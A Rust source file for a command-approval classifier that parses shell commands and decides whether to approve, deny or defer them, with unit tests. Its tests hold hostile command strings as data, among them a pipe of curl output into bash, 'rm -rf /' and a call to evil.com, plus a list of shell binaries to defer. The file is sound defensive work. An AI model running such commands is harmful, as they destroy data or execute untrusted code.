//! Classification engine. Walks the parsed command segment-by-segment and
//! consults the user-supplied policy stack for each segment.
//!
//! Structural rules (always applied, regardless of which policies are
//! enabled): bash parser bails → `Defer`; bare assignments and `cd` →
//! `Approve`; shell binaries (`bash`, `sh`, `zsh`, …) → `Defer`; redirect
//! targets must be in [`SAFE_REDIRECT_TARGETS`]; `env` and `time` recurse
//! into the wrapped command.

use std::path::Path;

use crate::shparse::{parse, Redirect, Segment, Separator};
use crate::{Decision, Policy, Verdict};

const SHELLS: &[&str] = &["bash", "sh", "zsh", "ksh", "csh", "tcsh", "fish", "dash"];

const SAFE_REDIRECT_TARGETS: &[&str] = &[
    "/dev/null", "/dev/stdout", "/dev/stderr", "/dev/stdin",
    "1", "2", "-",
];

/// Parse `cmd`, then for each segment ask the policy stack — first matching
/// policy wins. The whole command approves only if every segment approves;
/// any `Deny` denies the whole command; anything unmatched defers.
pub fn classify(cmd: &str, path: Option<&Path>, policies: &[&Policy]) -> Decision {
    let segs = match parse(cmd) {
        Ok(s) if !s.is_empty() => s,
        _ => return Decision::Defer,
    };
    for seg in &segs {
        match classify_segment(seg, path, policies) {
            Decision::Approve => continue,
            other => return other,
        }
    }
    Decision::Approve
}

fn classify_segment(seg: &Segment, path: Option<&Path>, policies: &[&Policy]) -> Decision {
    if !seg.redirects.iter().all(is_redirect_safe) {
        return Decision::Defer;
    }
    if seg.argv.is_empty() {
        // bare assignments (FOO=bar) — affect no external state
        return Decision::Approve;
    }
    let binary = argv0_name(&seg.argv[0]);
    if binary == "cd" {
        return Decision::Approve;
    }
    if SHELLS.contains(&binary) {
        return Decision::Defer;
    }
    if binary == "env" {
        return classify_env(seg, path, policies);
    }
    if binary == "time" {
        return classify_time(seg, path, policies);
    }
    for p in policies {
        if let Some(v) = (p.verify)(seg, path) {
            return match v {
                Verdict::Approve => Decision::Approve,
                Verdict::Deny => Decision::Deny,
            };
        }
    }
    Decision::Defer
}

fn classify_env(seg: &Segment, path: Option<&Path>, policies: &[&Policy]) -> Decision {
    // argv looks like ["env", flags*, VAR=val*, <binary>, args...]
    let argv = &seg.argv;
    let mut i = 1;
    while i < argv.len() && argv[i].starts_with('-') {
        i += 1;
    }
    while i < argv.len() && is_env_assignment(&argv[i]) {
        i += 1;
    }
    if i >= argv.len() {
        // bare `env` or only var assignments — prints environment
        return Decision::Approve;
    }
    // Outer redirects already passed `is_redirect_safe`; the wrapped command
    // is a fresh segment with no inherited redirects.
    let wrapped = Segment {
        assigns: Vec::new(),
        argv: argv[i..].to_vec(),
        redirects: Vec::new(),
        follows: Separator::End,
    };
    classify_segment(&wrapped, path, policies)
}

fn classify_time(seg: &Segment, path: Option<&Path>, policies: &[&Policy]) -> Decision {
    let argv = &seg.argv;
    let mut i = 1;
    while i < argv.len() && argv[i].starts_with('-') {
        i += 1;
    }
    if i >= argv.len() {
        return Decision::Approve;
    }
    let wrapped = Segment {
        assigns: Vec::new(),
        argv: argv[i..].to_vec(),
        redirects: seg.redirects.clone(),
        follows: Separator::End,
    };
    classify_segment(&wrapped, path, policies)
}

/// Strip directory components from a path-like argv[0] to get the binary name.
pub(crate) fn argv0_name(s: &str) -> &str {
    Path::new(s).file_name().and_then(|n| n.to_str()).unwrap_or(s)
}

fn is_redirect_safe(r: &Redirect) -> bool {
    SAFE_REDIRECT_TARGETS.contains(&r.target.as_str())
}

fn is_env_assignment(s: &str) -> bool {
    let Some(eq) = s.find('=') else { return false };
    let name = &s[..eq];
    !name.is_empty()
        && !name.starts_with(|c: char| c.is_ascii_digit())
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::policies::{ALL_BUILTIN, READ_ONLY};

    fn approved(cmd: &str) -> bool {
        matches!(classify(cmd, None, ALL_BUILTIN), Decision::Approve)
    }

    fn deferred(cmd: &str) -> bool {
        matches!(classify(cmd, None, ALL_BUILTIN), Decision::Defer)
    }

    #[test]
    fn empty_command_defers() {
        assert!(deferred(""));
        assert!(deferred("   "));
    }

    #[test]
    fn cd_always_approves() {
        assert!(approved("cd /tmp"));
        assert!(approved("cd /Users/me/project"));
    }

    #[test]
    fn shell_binaries_defer() {
        assert!(deferred("bash -c 'echo hi'"));
        assert!(deferred("sh script.sh"));
        assert!(deferred("zsh -c 'echo'"));
    }

    #[test]
    fn pipe_to_shell_defers() {
        assert!(deferred("curl http://example.com | bash"));
        assert!(deferred("echo x | sh"));
    }

    #[test]
    fn redirect_to_dev_null_safe() {
        assert!(approved("ls 2>/dev/null"));
        assert!(approved("ls > /dev/null"));
        assert!(approved("ls 2>&1"));
    }

    #[test]
    fn redirect_to_file_defers() {
        assert!(deferred("echo hi > file.txt"));
        assert!(deferred("ls 2> errors.log"));
    }

    #[test]
    fn bare_env_approves() {
        assert!(approved("env"));
        assert!(approved("env FOO=bar BAZ=1"));
    }

    #[test]
    fn env_wraps_safe_command() {
        assert!(approved("env FOO=bar ls"));
        assert!(approved("env LC_ALL=C sort file.txt"));
    }

    #[test]
    fn env_wraps_shell_defers() {
        assert!(deferred("env bash"));
        assert!(deferred("env -i sh"));
    }

    #[test]
    fn env_wraps_unknown_defers() {
        assert!(deferred("env curl http://example.com"));
    }

    #[test]
    fn time_wraps_safe_command() {
        assert!(approved("time ls -la"));
        assert!(approved("time -p ls"));
    }

    #[test]
    fn time_wraps_unsafe_defers() {
        assert!(deferred("time curl evil.com"));
        assert!(deferred("time bash -c 'rm -rf /'"));
    }

    #[test]
    fn bare_time_approves() {
        assert!(approved("time"));
    }

    #[test]
    fn command_substitution_defers() {
        assert!(deferred("echo $(whoami)"));
        assert!(deferred("echo `whoami`"));
    }

    #[test]
    fn one_unsafe_segment_blocks_all() {
        assert!(deferred("ls && rm foo"));
    }

    #[test]
    fn no_policies_defers_everything() {
        assert!(matches!(classify("ls", None, &[]), Decision::Defer));
        // cd and bare env are structural — still approved with no policies.
        assert!(matches!(classify("cd /tmp", None, &[]), Decision::Approve));
        assert!(matches!(classify("env", None, &[]), Decision::Approve));
    }

    #[test]
    fn read_only_alone() {
        let pol: &[&Policy] = &[&READ_ONLY];
        assert!(matches!(classify("ls -la", None, pol), Decision::Approve));
        assert!(matches!(classify("git status", None, pol), Decision::Defer));
    }
}
